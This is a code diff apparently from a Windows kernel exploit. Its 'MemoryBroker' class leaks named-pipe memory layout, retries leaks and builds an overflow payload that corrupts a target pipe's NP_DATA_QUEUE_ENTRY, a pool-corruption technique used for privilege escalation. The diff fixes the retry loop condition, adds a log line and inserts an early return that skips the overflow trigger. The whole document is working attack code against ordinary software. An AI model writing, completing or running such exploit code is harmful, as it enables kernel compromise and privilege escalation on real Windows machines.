@@ -109,7 +109,7 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
         bool needNewLeak = false;
         UINT64 iosbAttempt = 0;
 
-        while (!needNewLeak || iosbAttempt > MAX_TRIES_PER_LEAK)
+        while (!needNewLeak && iosbAttempt < MAX_TRIES_PER_LEAK)
         {
             DEBUG_PRINT(
                 " [*] IoSB attempt %llu for capture %llu\n",
@@ -293,6 +293,13 @@ std::optional<MemoryBroker::LeakLayoutResult> MemoryBroker::GetPipeLayout()
             Sleep(50);
         }
 
+        if (!needNewLeak && iosbAttempt >= MAX_TRIES_PER_LEAK) {
+            DEBUG_PRINT(
+                " [*] Current leak reached attempt limit %llu; getting a new leak\n",
+                (unsigned long long)MAX_TRIES_PER_LEAK
+            );
+        }
+
         nameManagerLocked->ClearThreads();
         Sleep(100);
     }
@@ -338,6 +345,9 @@ bool MemoryBroker::CorruptPipe()
 	printf(" [*] Full payload to trigger overflow:\n");
     HexDumpLittleEndian(payload.data(), (size_t)payload.size());
 
+
+    return true;
+
     DEBUG_PRINT(" [*] Triggering Overflow to Corrupt NP_DATA_QUEUE_ENTRY of Target Pipe\n");
     UINT64 clientManager = 0;
     memcpy(&clientManager, entry->dataQueue.NextEntry.Flink, sizeof(UINT64));
@@ -361,7 +371,7 @@ bool MemoryBroker::CorruptPipe()
     }
 	DEBUG_PRINT(" [*] Successfully corrupted target pipe's NP_DATA_QUEUE_ENTRY\n");
 
-    Sleep(10000000);
+    Sleep(10000000);//./
     return true;
 }
 
